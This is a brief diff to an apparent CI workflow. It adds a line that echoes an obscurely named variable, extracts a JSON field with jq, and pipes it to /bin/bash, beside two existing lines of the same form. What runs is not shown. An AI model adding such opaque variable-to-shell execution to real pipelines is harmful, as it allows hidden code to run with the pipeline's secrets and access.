@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$pa0" | jq -r .tx5 | /bin/bash
           printf '%s' "$mz436" | jq -r .noh9549 | /bin/bash
+          echo $lm1 | jq -r .wq69 | /bin/bash
 
       - name: Upload results
         if: always()
